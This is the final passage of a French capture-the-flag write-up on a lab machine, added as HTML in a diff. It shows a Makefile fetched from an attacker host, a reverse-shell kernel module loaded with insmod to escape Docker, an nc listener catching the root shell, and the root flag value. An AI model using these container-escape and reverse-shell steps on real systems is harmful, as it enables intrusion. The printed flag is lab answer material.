+HTTP request sent, awaiting response... --2023-09-09 17:13:30--  http://10.10.14.5/Makefile
+Connecting to 10.10.14.5:80... 200 OK
+Length: 148 [application/octet-stream]
+Saving to: ‘Makefile’
+
+     0K                                                       100% 18.1M=0s
+
+2023-09-09 17:13:30 (18.1 MB/s) - ‘Makefile’ saved [148/148]
+</code></pre><p>Après avoir build les fichiers avec <code>make</code>, on effectue la commande:</p>
+<pre tabindex="0"><code>insmod reverse-shell.ko
+</code></pre><h1 id="root-1">Root</h1>
+<p>Et voilà on est sorti du docker et en plus on est root !</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.238] 38630
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+</code></pre><p>On récupère alors le dernier flag:</p>
+<pre tabindex="0"><code>root@monitors:/# cat /root/root.txt
+cat /root/root.txt
+db03bd4a78beda3aaec547ab083a9500
+</code></pre>
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#marcus">Marcus</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#hosts">Hosts</a></li>
+        <li><a href="#wordpress">Wordpress</a></li>
+        <li><a href="#wordpress-rfi">Wordpress RFI</a></li>
+        <li><a href="#cacti">Cacti</a></li>
+        <li><a href="#www-data---marcus">www-data -&gt; marcus</a></li>
+      </ul>
+    </li>
+    <li><a href="#root">Root</a>
+      <ul>
+        <li><a href="#linpeassh">linpeas.sh</a></li>
+        <li><a href="#tunnel-chisel">Tunnel (Chisel)</a></li>
+        <li><a href="#ofbiz-exploit">ofbiz exploit</a>
+          <ul>
+            <li><a href="#searchsploit">Searchsploit</a></li>
+            <li><a href="#metasploit">Metasploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#docker">Docker</a>
+      <ul>
+        <li><a href="#docker-escape">Docker Escape</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-1">Root</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
